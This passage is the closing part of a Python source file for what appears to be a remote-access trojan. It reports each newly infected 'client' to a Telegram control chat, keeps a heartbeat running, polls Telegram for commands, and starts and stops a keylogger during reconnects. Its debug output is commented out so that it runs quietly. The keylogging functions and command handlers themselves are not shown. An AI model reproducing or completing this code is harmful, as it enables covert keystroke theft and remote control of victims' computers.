         bot.send_message(HEARTBEAT_CHAT_ID, f"🚀 **新客户端上线**\n{startup_info}")
         # Start heartbeat only after successful initial message
         start_heartbeat()
    except Exception as e:
         # print(f"Failed to send initial startup message or start heartbeat: {e}")
         # Continue trying to poll even if initial message fails
         pass


    while True:
        try:
            # Use timeout and long_polling_timeout for better handling
            # Skip_pending = True will skip any messages sent while the bot was offline
            bot.infinity_polling(timeout=20, long_polling_timeout=10, skip_pending=True)
            # If infinity_polling returns (e.g., manually stopped), break the loop
            break

        except (requests.exceptions.ConnectionError,
                requests.exceptions.ReadTimeout,
                requests.exceptions.Timeout,
                telebot.apihelper.ApiTelegramException) as e:
            # print(f"Polling error: {e}. Retrying in 30 seconds...")
            stop_heartbeat_thread() # Stop heartbeat during disconnection
            stop_keylogger()      # Stop keylogger too
            time.sleep(30)
        except KeyboardInterrupt:
             # print("Keyboard interrupt received, stopping bot.")
             break
        except Exception as e:
            # print(f"Unknown error during polling: {e}. Retrying in 60 seconds...")
            stop_heartbeat_thread()
            stop_keylogger()
            time.sleep(60) # Wait longer for unknown errors

    # Cleanup before exiting
    # print("Bot stopping. Cleaning up threads...")
    stop_heartbeat_thread()
    stop_keylogger()
    # print("Cleanup complete. Exiting.")


if __name__ == "__main__":
    # Add a small delay before starting? (Original code had sleep(3))
    # time.sleep(3)
    main_loop()